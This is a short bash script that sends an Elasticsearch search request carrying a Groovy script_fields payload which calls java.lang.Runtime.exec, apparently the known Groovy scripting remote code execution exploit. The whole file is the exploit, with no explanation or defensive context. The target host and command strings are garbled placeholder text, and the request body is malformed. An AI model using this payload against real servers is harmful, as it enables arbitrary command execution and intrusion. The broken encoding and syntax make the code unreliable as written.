#!/bin/bash

curl -XPOST "Ŀ���ַ:9200/_search" -d
{
    "size":1,
    "script_fields": 
        {"knownsec": 
            {"script":
                 "p=Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"��Ҫִ�е�����\").getText()","lang": "groovy"
            }
        }
}